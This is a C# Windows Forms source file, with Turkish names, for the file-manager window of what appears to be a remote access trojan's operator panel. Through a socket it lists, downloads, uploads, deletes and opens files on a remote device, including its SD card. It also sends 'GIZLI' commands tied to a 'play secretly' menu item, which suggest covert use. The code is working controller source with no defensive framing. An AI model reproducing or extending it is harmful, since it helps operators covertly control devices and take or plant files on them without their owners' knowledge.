using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Windows.Forms;
namespace SV
{
    public partial class FİleManager : Form
    {
        Socket soketimiz;
        public string ID = "";
        public FİleManager(Socket s, string aydi)
        {
            InitializeComponent();
            soketimiz = s;
            ID = aydi;
        }
        private void indirToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Text = "Dosya Yöneticisi - ";
                    timer1.Enabled = true;
                    Form1.KomutGonder("INDIR", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        public void karsiyaYukle(TextBox textBox)
        {
            if (string.IsNullOrEmpty(textBox.Text) == false)
            {
                using (OpenFileDialog op = new OpenFileDialog()
                {
                    Multiselect = false,
                    Filter = "Tüm dosyalar|*.*",
                    Title = "Karşıya yüklemek için bir dosya seçiniz.."
                })
                {
                    if (op.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            Form1.KomutGonder("DOSYABYTE", "[VERI]"
                                + Convert.ToBase64String(File.ReadAllBytes(op.FileName)) + "[VERI]" + op.FileName.Substring(
                                op.FileName.LastIndexOf(@"\") + 1) + "[VERI]" + textBox.Text + "[VERI][0x09]", soketimiz);
                        }
                        catch (Exception) { }
                        Text = "Dosya Yöneticisi - Yükleniyor..";
                    }
                }
            }
        }
        private void yükleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            karsiyaYukle(textBox1);
        }
        public void yenile()
        {
            if (textBox1.Text != "")
            {
                try
                {
                    Form1.KomutGonder("FOLDERFILE", "[VERI]" + textBox1.Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        public void yenileSD()
        {
            if (textBox2.Text != "")
            {
                listView2.BackgroundImage = null;
                try
                {
                    Form1.KomutGonder("FILESDCARD", "[VERI]" + textBox2.Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.BackgroundImage = null;
            yenile();
        }

        private void sİlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Form1.KomutGonder("DELETE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
             listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                    listView1.SelectedItems[0].Remove();
                }
                catch (Exception) { }
            }
        }

        private void açToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Form1.KomutGonder("DOSYAAC", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
                     listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void açToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Form1.KomutGonder("DOSYAAC", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void yenileToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            yenileSD();
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Form1.KomutGonder("DELETE", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void gizliÇalToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Form1.KomutGonder("GIZLI", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void indirToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Text = "Dosya Yöneticisi - "; timer1.Enabled = true;
                    Form1.KomutGonder("INDIR", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Text = "Dosya Yöneticisi";
                if (listView1.SelectedItems[0].ImageIndex == 13)
                {
                    if (textBox1.Text.Substring(textBox1.Text.LastIndexOf("/")) != "/0")
                    {
                        listView1.BackgroundImage = null;
                        textBox1.Text = textBox1.Text.Replace(textBox1.Text.Substring(textBox1.Text.LastIndexOf("/")),
                            "");
                        yenile();
                    }
                }
                else
                {
                    if (listView1.SelectedItems[0].ImageIndex == 0)
                    {
                        listView1.BackgroundImage = null;
                        textBox1.Text = listView1.SelectedItems[0].SubItems[1].Text;
                        try
                        {
                            Form1.KomutGonder("FOLDERFILE", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        private void listView2_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                Text = "Dosya Yöneticisi - ";
                if (listView2.SelectedItems[0].ImageIndex == 13)
                {
                    if (textBox2.Text.Count(slash => slash == '/') > 2)
                    {
                        listView2.BackgroundImage = null;
                        textBox2.Text = textBox2.Text.Replace(textBox2.Text.Substring(textBox2.Text.LastIndexOf("/")),
                            "");
                        yenileSD();
                    }
                }
                else
                {
                    if (listView2.SelectedItems[0].ImageIndex == 0)
                    {
                        listView2.BackgroundImage = null;
                        textBox2.Text = listView2.SelectedItems[0].SubItems[1].Text;
                        try
                        {
                            Form1.KomutGonder("FILESDCARD", "[VERI]" + listView2.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", soketimiz);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        private void yükleToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            karsiyaYukle(textBox2);
        }

        private void başlatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Form1.KomutGonder("GIZLI", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "/" +
             listView1.SelectedItems[0].Text + "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }

        private void durdurToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0)
            {
                try
                {
                    Form1.KomutGonder("GIZKAPA", "[VERI][0x09]", soketimiz);
                }
                catch (Exception) { }
            }
        }
        public int count = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            Text += ".";
            count++;
            if (count % 4 == 0)
            {
                Text = "Dosya Yöneticisi - ";
                count = 0;
            }
        }
    }
}
